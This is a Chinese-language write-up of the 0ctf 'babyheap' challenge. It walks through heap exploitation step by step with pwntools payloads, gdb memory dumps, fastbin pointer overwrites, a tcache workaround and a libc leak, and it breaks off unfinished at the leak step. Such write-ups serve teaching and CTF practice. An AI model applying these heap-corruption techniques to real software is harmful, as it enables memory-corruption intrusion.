# 深入分析一道0ctf的pwn题——babyheap

```python
 % cat myexp.py 
from pwn import *


context.log_level = 'debug'
p = process('./babyheap')

def exp():
    p.interactive()



if __name__ == '__main__':
    exp()
```

我写了这个脚本来方便调试
这样就可以在gdb中attach程序来调试了

我们先这样
```
    alloc(0x20)
    alloc(0x20)     # <--- chunk being freed
    alloc(0x20)
    alloc(0x20)
    alloc(0x80)

   
```

这时候查看堆内存，可以看到我们申请的chunk， 记住堆是由低地址向高地址生长的
```
pwndbg> x/50gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000031 《--chunk0
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000031 《--chunk1
0x555555757290:	0x0000000000000000	0x0000000000000000
0x5555557572a0:	0x0000000000000000	0x0000000000000000
0x5555557572b0:	0x0000000000000000	0x0000000000000031 《--chunk2
0x5555557572c0:	0x0000000000000000	0x0000000000000000
0x5555557572d0:	0x0000000000000000	0x0000000000000000
0x5555557572e0:	0x0000000000000000	0x0000000000000031 《--chunk3
0x5555557572f0:	0x0000000000000000	0x0000000000000000
0x555555757300:	0x0000000000000000	0x0000000000000000
0x555555757310:	0x0000000000000000	0x0000000000000091 《--chunk4
0x555555757320:	0x0000000000000000	0x0000000000000000
0x555555757330:	0x0000000000000000	0x0000000000000000
0x555555757340:	0x0000000000000000	0x0000000000000000
0x555555757350:	0x0000000000000000	0x0000000000000000
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000000
0x555555757380:	0x0000000000000000	0x0000000000000000
0x555555757390:	0x0000000000000000	0x0000000000000000
0x5555557573a0:	0x0000000000000000	0x0000000000020c61
0x5555557573b0:	0x0000000000000000	0x0000000000000000
```
之后我们free掉1
继续查看堆内存
```
pwndbg> x/50gx 0x555555757230
0x555555757230:	0x0000000000000000	0x0000000000000000
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000031 in use
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000031 free
0x555555757290:	0x0000000000000000	0x0000000000000000
0x5555557572a0:	0x0000000000000000	0x0000000000000000
0x5555557572b0:	0x0000000000000000	0x0000000000000031 in use 
0x5555557572c0:	0x0000000000000000	0x0000000000000000
0x5555557572d0:	0x0000000000000000	0x0000000000000000
0x5555557572e0:	0x0000000000000000	0x0000000000000031 in use
0x5555557572f0:	0x0000000000000000	0x0000000000000000
0x555555757300:	0x0000000000000000	0x0000000000000000
0x555555757310:	0x0000000000000000	0x0000000000000091 in use
0x555555757320:	0x0000000000000000	0x0000000000000000
0x555555757330:	0x0000000000000000	0x0000000000000000
0x555555757340:	0x0000000000000000	0x0000000000000000
0x555555757350:	0x0000000000000000	0x0000000000000000
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000000
0x555555757380:	0x0000000000000000	0x0000000000000000
0x555555757390:	0x0000000000000000	0x0000000000000000
0x5555557573a0:	0x0000000000000000	0x0000000000020c61
```
你会发现其实都没什么变化

```
pwndbg> x/40gx &main_arena
0x7ffff7dcfc40 <main_arena>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc50 <main_arena+16>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc60 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc70 <main_arena+48>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc80 <main_arena+64>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc90 <main_arena+80>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfca0 <main_arena+96>:	0x00005555557573a0	0x0000000000000000
0x7ffff7dcfcb0 <main_arena+112>:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x7ffff7dcfcc0 <main_arena+128>:	0x00007ffff7dcfcb0	0x00007ffff7dcfcb0
0x7ffff7dcfcd0 <main_arena+144>:	0x00007ffff7dcfcc0	0x00007ffff7dcfcc0
0x7ffff7dcfce0 <main_arena+160>:	0x00007ffff7dcfcd0	0x00007ffff7dcfcd0
0x7ffff7dcfcf0 <main_arena+176>:	0x00007ffff7dcfce0	0x00007ffff7dcfce0
0x7ffff7dcfd00 <main_arena+192>:	0x00007ffff7dcfcf0	0x00007ffff7dcfcf0
0x7ffff7dcfd10 <main_arena+208>:	0x00007ffff7dcfd00	0x00007ffff7dcfd00
0x7ffff7dcfd20 <main_arena+224>:	0x00007ffff7dcfd10	0x00007ffff7dcfd10
0x7ffff7dcfd30 <main_arena+240>:	0x00007ffff7dcfd20	0x00007ffff7dcfd20
0x7ffff7dcfd40 <main_arena+256>:	0x00007ffff7dcfd30	0x00007ffff7dcfd30
0x7ffff7dcfd50 <main_arena+272>:	0x00007ffff7dcfd40	0x00007ffff7dcfd40
0x7ffff7dcfd60 <main_arena+288>:	0x00007ffff7dcfd50	0x00007ffff7dcfd50
0x7ffff7dcfd70 <main_arena+304>:	0x00007ffff7dcfd60	0x00007ffff7dcfd60
```


当我们free(2)时
```
pwndbg> x/50gx 0x555555757240
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000031 <chunk 0 in use>
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000031 <chunk 1 fastbin 已经free>
0x555555757290:	0x0000000000000000	0x0000000000000000
0x5555557572a0:	0x0000000000000000	0x0000000000000000
0x5555557572b0:	0x0000000000000000	0x0000000000000031 <chunk 2 fastbin free>
0x5555557572c0:	0x0000555555757290	0x0000000000000000
0x5555557572d0:	0x0000000000000000	0x0000000000000000
0x5555557572e0:	0x0000000000000000	0x0000000000000031 <chunk3 in use>
0x5555557572f0:	0x0000000000000000	0x0000000000000000
0x555555757300:	0x0000000000000000	0x0000000000000000
0x555555757310:	0x0000000000000000	0x0000000000000091 <chunk 4 (smallbin, in use)>
0x555555757320:	0x0000000000000000	0x0000000000000000
0x555555757330:	0x0000000000000000	0x0000000000000000
0x555555757340:	0x0000000000000000	0x0000000000000000
0x555555757350:	0x0000000000000000	0x0000000000000000
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000000
0x555555757380:	0x0000000000000000	0x0000000000000000
0x555555757390:	0x0000000000000000	0x0000000000000000
0x5555557573a0:	0x0000000000000000	0x0000000000020c61
0x5555557573b0:	0x0000000000000000	0x0000000000000000
0x5555557573c0:	0x0000000000000000	0x0000000000000000
```

ok接下来我们要做的事情就是先修改chunk2的fd让其指向chunk4， 并且通过chunk3修改chunk4的大小

```python
payload = p64(0)*5
payload += p64(0x31)
payload += p64(0)*5
payload += p64(0x31)
payload += p8(0x10)
payload += p8(0x73)
fill(0, payload)
```

输出结果：
```
pwndbg> x/50gx 0x555555757240
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000031 chunk 0
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000031 chunk 1
0x555555757290:	0x0000000000000000	0x0000000000000000
0x5555557572a0:	0x0000000000000000	0x0000000000000000 
0x5555557572b0:	0x0000000000000000	0x0000000000000031 chunk 2
0x5555557572c0:	0x0000555555757310	0x0000000000000000
0x5555557572d0:	0x0000000000000000	0x0000000000000000
0x5555557572e0:	0x0000000000000000	0x0000000000000031 chunk 3
0x5555557572f0:	0x0000000000000000	0x0000000000000000
0x555555757300:	0x0000000000000000	0x0000000000000000
0x555555757310:	0x0000000000000000	0x0000000000000091 chunk 4
0x555555757320:	0x0000000000000000	0x0000000000000000
0x555555757330:	0x0000000000000000	0x0000000000000000
0x555555757340:	0x0000000000000000	0x0000000000000000
0x555555757350:	0x0000000000000000	0x0000000000000000
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000000
0x555555757380:	0x0000000000000000	0x0000000000000000
0x555555757390:	0x0000000000000000	0x0000000000000000
0x5555557573a0:	0x0000000000000000	0x0000000000020c61
```

ok 我们完成了我们想要的第一个效果， 接下来去覆盖掉chunk 3
```python
payload = p64(0)*5
payload += p64(0x31)
fill(3, payload)
```
接下啦查看内存
```
pwndbg> x/50gx 0x555555757240
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000031
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000031
0x555555757290:	0x0000000000000000	0x0000000000000000
0x5555557572a0:	0x0000000000000000	0x0000000000000000
0x5555557572b0:	0x0000000000000000	0x0000000000000031
0x5555557572c0:	0x0000555555757310	0x0000000000000000
0x5555557572d0:	0x0000000000000000	0x0000000000000000
0x5555557572e0:	0x0000000000000000	0x0000000000000031
0x5555557572f0:	0x0000000000000000	0x0000000000000000
0x555555757300:	0x0000000000000000	0x0000000000000000
0x555555757310:	0x0000000000000000	0x0000000000000031
0x555555757320:	0x0000000000000000	0x0000000000000000
0x555555757330:	0x0000000000000000	0x0000000000000000
0x555555757340:	0x0000000000000000	0x0000000000000000
0x555555757350:	0x0000000000000000	0x0000000000000000
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000000
0x555555757380:	0x0000000000000000	0x0000000000000000
0x555555757390:	0x0000000000000000	0x0000000000000000
0x5555557573a0:	0x0000000000000000	0x0000000000020c61
0x5555557573b0:	0x0000000000000000	0x0000000000000000
0x5555557573c0:	0x0000000000000000	0x0000000000000000
```
ok我们成功了

如果我们再进行
```
alloc(0x20)
alloc(0x20)
```
结果:
```
0x555555757240:	0x0000000000000000	0x0000000000000000
0x555555757250:	0x0000000000000000	0x0000000000000031
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000031
0x555555757290:	0x0000000000000000	0x0000000000000000
0x5555557572a0:	0x0000000000000000	0x0000000000000000
0x5555557572b0:	0x0000000000000000	0x0000000000000031
0x5555557572c0:	0x0000555555757310	0x0000000000000000
0x5555557572d0:	0x0000000000000000	0x0000000000000000
0x5555557572e0:	0x0000000000000000	0x0000000000000031
0x5555557572f0:	0x0000000000000000	0x0000000000000000
0x555555757300:	0x0000000000000000	0x0000000000000000
0x555555757310:	0x0000000000000000	0x0000000000000031
0x555555757320:	0x0000000000000000	0x0000000000000000
0x555555757330:	0x0000000000000000	0x0000000000000000
0x555555757340:	0x0000000000000000	0x0000000000000000
0x555555757350:	0x0000000000000000	0x0000000000000000
0x555555757360:	0x0000000000000000	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000000
0x555555757380:	0x0000000000000000	0x0000000000000000
0x555555757390:	0x0000000000000000	0x0000000000000000
0x5555557573a0:	0x0000000000000000	0x0000000000000031
0x5555557573b0:	0x0000000000000000	0x0000000000000000
0x5555557573c0:	0x0000000000000000	0x0000000000000000
```

突然发现自己之前的为什么会做不出来了，因为多了一个`tcachebins`的机制
我们只好傻一点
```python
def exp():
    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x10)

    free(0)
    free(1)
    free(2)
    free(3)
    free(4)
    free(5)
    free(6)
    
    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x10)
    alloc(0x80)
    free(2)
    free(1)
```
先把`tcachebins`填满好了

```
pwndbg> bins 
tcachebins
0x20 [  7]: 0x555555757320 —▸ 0x555555757300 —▸ 0x5555557572e0 —▸ 0x5555557572c0 —▸ 0x5555557572a0 ◂— ...
fastbins
0x20: 0x555555757350 —▸ 0x555555757370 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

内存布局如下：
```
0x555555757330:	0x0000000000000000	0x0000000000000021 <chunk 0>
0x555555757340:	0x0000000000000000	0x0000000000000000
0x555555757350:	0x0000000000000000	0x0000000000000021 <chunk 1 free>
0x555555757360:	0x0000555555757370	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000021 <chunk 2 free>
0x555555757380:	0x0000000000000000	0x0000000000000000
0x555555757390:	0x0000000000000000	0x0000000000000021 <chunk 3>
0x5555557573a0:	0x0000000000000000	0x0000000000000000
0x5555557573b0:	0x0000000000000000	0x0000000000000091 <chunk 4>
0x5555557573c0:	0x0000000000000000	0x0000000000000000
0x5555557573d0:	0x0000000000000000	0x0000000000000000
0x5555557573e0:	0x0000000000000000	0x0000000000000000
0x5555557573f0:	0x0000000000000000	0x0000000000000000
0x555555757400:	0x0000000000000000	0x0000000000000000
0x555555757410:	0x0000000000000000	0x0000000000000000
0x555555757420:	0x0000000000000000	0x0000000000000000
0x555555757430:	0x0000000000000000	0x0000000000000000
0x555555757440:	0x0000000000000000	0x0000000000020bc1

```

之后
>  edit idx 0 chunk to particial overwrite idx1's fd to point to idx4 

```python
payload = p64(0)*3
payload += p64(0x21)
payload += p8(0xb0)
fill(0, payload)
```

这时候查看fastbins
```
pwndbg> bins 
tcachebins
0x20 [  7]: 0x555555757320 —▸ 0x555555757300 —▸ 0x5555557572e0 —▸ 0x5555557572c0 —▸ 0x5555557572a0 ◂— ...
fastbins
0x20: 0x555555757350 —▸ 0x5555557573b0 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```
可以看到指针位置发生了变化


```
pwndbg> x/40gx &main_arena 
0x7ffff7dcfc40 <main_arena>:	0x0000000000000000	0x0000000000000001
0x7ffff7dcfc50 <main_arena+16>:	0x0000555555757350	0x0000000000000000
0x7ffff7dcfc60 <main_arena+32>:	0x0000000000000000	0x0000000000000000
0x7ffff7dcfc70 <main_arena+48>:	0x0000000000000000	0x0000000000000000
```

修改完之后的内存布局
```
0x555555757330:	0x0000000000000000	0x0000000000000021 <chunk 0>
0x555555757340:	0x0000000000000000	0x0000000000000000 
0x555555757350:	0x0000000000000000	0x0000000000000021 <chunk 1>
0x555555757360:	0x00005555557573b0	0x0000000000000000
0x555555757370:	0x0000000000000000	0x0000000000000021 <chunk 2>
0x555555757380:	0x0000000000000000	0x0000000000000000
0x555555757390:	0x0000000000000000	0x0000000000000021 <chunk 3>
0x5555557573a0:	0x0000000000000000	0x0000000000000000
0x5555557573b0:	0x0000000000000000	0x0000000000000091 <chunk 4>
0x5555557573c0:	0x0000000000000000	0x0000000000000000
0x5555557573d0:	0x0000000000000000	0x0000000000000000
0x5555557573e0:	0x0000000000000000	0x0000000000000000
0x5555557573f0:	0x0000000000000000	0x0000000000000000
0x555555757400:	0x0000000000000000	0x0000000000000000
0x555555757410:	0x0000000000000000	0x0000000000000000
0x555555757420:	0x0000000000000000	0x0000000000000000
0x555555757430:	0x0000000000000000	0x0000000000000000
0x555555757440:	0x0000000000000000	0x0000000000020bc1
```

目标达到， idx1的指针已经指向了idx4
之后通过idx3来设置idx4为0x21大小

```python
payload =p64(0)*3
payload += p8(0x21)
fill(3, payload)
alloc(0x10)
alloc(0x10)
```


payload = p64(0)*3
payload += p8(0x91)
fill(3, payload)

alloc(0x80)
free(4){}
print u64(dump(2))





